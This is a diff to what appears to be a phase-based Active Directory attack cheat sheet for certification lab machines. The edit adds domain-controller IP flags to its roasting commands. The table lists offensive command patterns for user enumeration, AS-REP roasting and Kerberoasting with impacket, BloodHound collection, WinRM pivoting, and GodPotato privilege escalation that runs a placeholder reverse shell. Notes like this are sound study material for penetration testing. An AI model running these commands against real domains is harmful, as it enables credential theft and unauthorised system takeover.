@@ -19,8 +19,8 @@ A chronological, phase-based tactical guide for Active Directory exploitation. S
 | Step | Command Pattern | Lab Context |
 | :--- | :--- | :--- |
 | **Triage** | `nxc smb [IP] -u [USER] -p [PASS] --users` | Users/Shares [Zeus/Medtech] |
-| **Roast (AS-REP)** | `impacket-GetNPUsers [DOM]/ -usersfile users.txt -request`| **NO PASS (Requires Userlist)** |
-| **Roast (Service)** | `impacket-GetUserSPNs [DOM]/[USER]:[PASS] -request`| **AUTH REQUIRED** |
+| **Roast (AS-REP)** | `impacket-GetNPUsers [DOM]/ -usersfile users.txt -request -dc-ip [IP]`| **NO PASS (Requires Userlist)** |
+| **Roast (Service)** | `impacket-GetUserSPNs [DOM]/[USER]:[PASS] -request -dc-ip [IP]`| **AUTH REQUIRED** |
 | **Blood** | `bloodhound-python ... -c All` | Pathfinding [Secura/Zeus] |
 | **Pivoting** | `nxc winrm [IP] -u [USER] -p [PASS] --local-auth`| Local Bypass [Secura/OSCPC] |
 | **PrivEsc** | `.\GodPotato-NET4.exe -cmd "[REV_SHELL]"` | System Shell [OSCPB/Hutch] |
